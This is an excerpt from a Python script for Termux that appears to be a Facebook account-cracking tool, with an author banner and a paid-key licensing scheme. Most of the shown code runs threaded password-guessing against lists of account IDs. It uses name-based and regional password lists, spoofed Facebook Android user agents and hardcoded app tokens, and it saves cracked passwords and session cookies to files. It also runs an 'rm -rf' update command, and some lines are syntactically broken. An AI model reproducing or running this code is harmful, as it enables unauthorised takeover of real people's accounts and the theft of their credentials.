...
def Setup():
	try:
		...
		if '8.7.2' in httpx.get(url).text:
			...
			time.sleep(1)
			os.system('rm -rf New && python A+S.py')
			exit()
	except ValueError:exit()
try:import httpx
except:exit(' Found error in http module! ')
xx=requests.get('https://raw.githubusercontent.com/A+S110/files/main/ua.txt').text.splitlines()
def clear():
	os.system('clear')
	print(logo)
logo=("""\033[1;94m
...
================================================
\033[1;31m================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{Jan ZaDa}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{Jan ZaDa}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{ok}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{Jan ZaDa}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93771211599 }\33[0;m
...
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mVERSION   \033[1;31m ┇\033[31;47m{0.7}\33[0;m                 
\033[1;31m================================================
...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrA+Sxxx-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrA+Sxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrA+Sxxx-cov', 'r').read()
kex=(f"A+S-XD{uid}TS{key1}110E==")
...
def apv():
	try:
		...
		if kex in link:clear();main()
			...
			line()
			url_wa = "https://api.whatsapp.com/send?phone=+93780076452&text="
			name = input(" Enter your Name : ")
			line()
			tks = ("Hi A+S Sir, I Need To Buy Your Paid A+S Tools Version 8.7.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
			subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
			print(' Run :  python A+S.py')
			line()
			exit()
	except ValueError:
		exit()
...
def main():
	...
	if x =='1':
		...
		os.system('xdg-open https://www.facebook.com/zulma.ayala.56')
...
def file():
	...
	with tred(max_workers=20) as aking:
		...
		for user in fo:
			...
			passlist = plist
			if mthd =='1':
				A+S.submit(m1,ids,names,passlist,fbcr)
			elif mthd =='2':
				A+S.submit(m2,ids,names,passlist,fbcr)
			elif mthd =='3':
				A+S.submit(m3,ids,names,passlist,fbcr)
			else:
				A+S.submit(m2,ids,names,passlist,fbcr)
	print('\033[1;37m')
	line()
	...
	with tred(max_workers=15) as khan:
		...
		for psx in user:
			...
			#	passlist = [psx,ids,'khankhan','kingkhan','khan1122']
				...
				passlist = [ids,psx,'100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345']
			else:
				passlist = [ids,psx,'khan12','khan1234','khan123','baloch123','khan1122','khan12345','khan123456','khank1]
...
def m1(ids,names,passlist,fbcr):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [A+S-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			ua = 'Dalvik/2.5.1 (Linux; U; Android 11; Xiaomi Mi 11 Build/RKQ1.200826.002) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version}FBDM/{density=3.5,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Xiaomi;FBMF/Mi 11;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 11;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'.replace('\n','')
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [A+S-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/A+S/A+S-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/A+S/A+S-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m2(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [A+S-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [A+S-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/A+S/A+S-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/A+S/A+S-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
...
def m3(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [A+S-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [A+S-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/A+S/A+S-M3-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/A+S/A+S-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def rd(ids,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [A+S-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
			accessToken = random.choice(tokenlist)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
				print('\r\r\033[1;32m [A+S-OK] '+uid+' | '+pas)
				oks.append(ids)
				open('/sdcard/A+S/A+S-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/A+S/A+S-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
